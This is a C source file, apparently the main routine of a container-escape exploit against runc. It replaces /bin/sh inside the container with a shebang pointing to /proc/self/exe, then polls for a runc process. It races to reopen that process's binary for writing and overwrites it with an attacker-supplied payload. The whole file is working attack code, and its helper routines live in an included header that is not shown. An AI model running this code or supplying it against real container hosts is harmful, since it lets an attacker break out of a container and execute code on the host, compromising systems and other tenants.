#include "../lib/exploit.h"

int main(int argc, char* argv[]) {
    // parse command-line arguments
    char* cmd = NULL;
    int cmd_len = 0;
    if(parse_args(argc, argv, &cmd, &cmd_len) != EXIT_SUCCESS) {
        return EXIT_FAILURE;
    }

    // prepare payload based on user input or default
    size_t payload_length = setup_payload(cmd, cmd_len);

    // overwrite /bin/sh with shebang that redirects to /proc/self/exe
    int sh_fd = open(SHELL_PATH, O_WRONLY | O_TRUNC);
    if(sh_fd == -1) {
        perror("[-] failed to open /bin/sh");
        return EXIT_FAILURE;
    }

    if(write(sh_fd, SHEBANG, strlen(SHEBANG)) == -1) {
        perror("[-] failed to write shebang to /bin/sh");
        close(sh_fd);
        return EXIT_FAILURE;
    }

    close(sh_fd);
    printf("[+] /bin/sh successfully replaced with shebang\n");

    // wait for runc process to appear
    printf("waiting for runc process...\n");

    runc_info_t info;
    int runc_fd = -1;

    // loop until runc binary is found and opened with O_PATH
    while(1) {
        info = find_runc_info();
        if(info.pid != -1) {
            printf("[*] found runc pid %d at %s\n", info.pid, info.exe_path);

            char link_path[PATH_MAX];
            snprintf(link_path, sizeof(link_path), "/proc/%d/exe", info.pid);

            runc_fd = open(link_path, O_PATH);
            if(runc_fd == -1) {
                perror("[-] failed to open runc exe read-only");
                usleep(10); // short delay before retrying
                continue;
            }

            printf("[+] opened runc binary via fd: /proc/%d/exe (fd = %d)\n", info.pid, runc_fd);
            break;
        }
    }

    // attempt to write payload to the opened runc binary using /proc/self/fd indirection
    if(runc_fd != -1) {
        char write_path[64];
        snprintf(write_path, sizeof(write_path), "/proc/self/fd/%d", runc_fd);

        int write_fd = -1;
        const int max_attempts = 100;
        int attempts = 0;

        // retry until write access is granted (race condition window)
        while(write_fd == -1 && attempts++ < max_attempts) {
            write_fd = open(write_path, O_WRONLY | O_TRUNC);
            if(write_fd == -1) {
                usleep(10); // retry after short delay
            }
        }

        ssize_t written = write(write_fd, payload, payload_length);
        if(written == -1) {
            perror("[-] could not write payload");
            close(write_fd);
            close(runc_fd);
            return EXIT_FAILURE;
        }

        printf("[+] wrote payload (%ld bytes) to /proc/self/fd/%d\n", written, runc_fd);

        close(write_fd);
        close(runc_fd);
    }

    return EXIT_SUCCESS;
}
